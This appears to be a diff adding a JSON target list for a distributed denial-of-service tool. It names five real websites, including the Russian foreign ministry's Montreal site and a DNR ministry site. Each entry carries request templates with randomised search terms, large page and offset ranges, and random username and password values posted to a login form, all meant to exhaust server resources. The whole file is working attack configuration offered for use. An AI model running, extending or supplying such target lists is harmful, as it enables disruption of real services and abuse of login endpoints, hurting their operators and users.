@@ -1,0 +1,47 @@
+{
+  "targets": [
+    {
+      "target": "https://inforeactor.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "{\"query\":\"{{str(1)}} {{str(1)}}\",\"options\":{\"full\":true,\"limit\":{{int(1,1000)}},\"offset\":{{int(1,1000)}},\"maxDate\":16657520267,\"type\":\"byDate\",\"days\":\"365\",\"categories\":[],\"fields\":[\"title\",\"data\"]}}",
+        "headers": "{\"Content-Type\": \"application/json\", \"Referer\": \"https://inforeactor.ru/search\"}",
+        "path_qs": "/html/searchPosts/render/",
+        "verb": "POST"
+      }
+    },
+    {
+      "target": "https://legrand.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://legrand.ru/\"}",
+        "path_qs": "/search/index.php?q=a&page={{int(1,3000)}}"
+      }
+    },
+    {
+      "target": "https://montreal.mid.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "_58_formDate=1665752026703&_58_saveLastPath=false&_58_redirect=&_58_doActionAfterLogin=false&_58_login={{str(6)}}&_58_password={{str(8)}}{{int(1,99)}}%21%40&_58_rememberMe=false&_58_rememberMeCheckbox=false",
+        "headers": "{\"Referer\": \"https://montreal.mid.ru/\"}",
+        "path_qs": "/glavnaa?p_p_id=58&p_p_lifecycle=1&p_p_state=exclusive&p_p_mode=view&_58_struts_action=%2Flogin%2Flogin"
+      }
+    },
+    {
+      "target": "https://mid-dnr.su",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://mid-dnr.su/\"}",
+        "path_qs": "/ru/search/?search={{str(1)}}&page={{int(1,346)}}"
+      }
+    },
+    {
+      "target": "https://mid-dnr.su",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://mid-dnr.su/\"}",
+        "path_qs": "/ru/?page={{int(1,650)}}"
+      }
+    }
+  ]
+}
